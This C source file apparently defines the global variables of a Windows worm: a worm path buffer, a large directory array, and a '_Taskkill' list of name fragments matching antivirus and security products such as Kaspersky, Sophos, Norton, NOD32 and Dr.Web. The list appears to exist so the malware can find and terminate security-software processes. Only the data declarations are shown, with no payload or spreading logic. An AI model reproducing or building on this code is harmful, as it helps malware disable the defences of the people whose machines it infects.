#include "data_globals.h"

char _windir[MAX_PATH] = {0};
char _wormpath[MAX_PATH] = {0};
char _DirArray[250000][260] = {0};
int _dircount = 0;
const char* _Taskkill[] = {
    "av","Av","AV","defend","Defend","DEFEND",
    "f-","F-","defense","Defense","DEFENSE",
    "Kaspersky","KASPERSKY","kaspersky",
    "sophos","SOPHOS","Sophos",
    "Scanner","SCANNER","scanner",
    "Norton","norton","NORTON",
    "Security","SECURITY","security",
    "Anti","ANTI","anti",
    "SCAN","Scan","scan",
    "Malware","MALWARE","malware",
    "Virus","VIRUS","virus",
    "NOD32","nod32","Nod32",
    "Zoner","ZONER","zoner",
    "SECUR","Secur","secur",
    "Dr.","DR.","DR.Web",
    NULL   // terminator
};
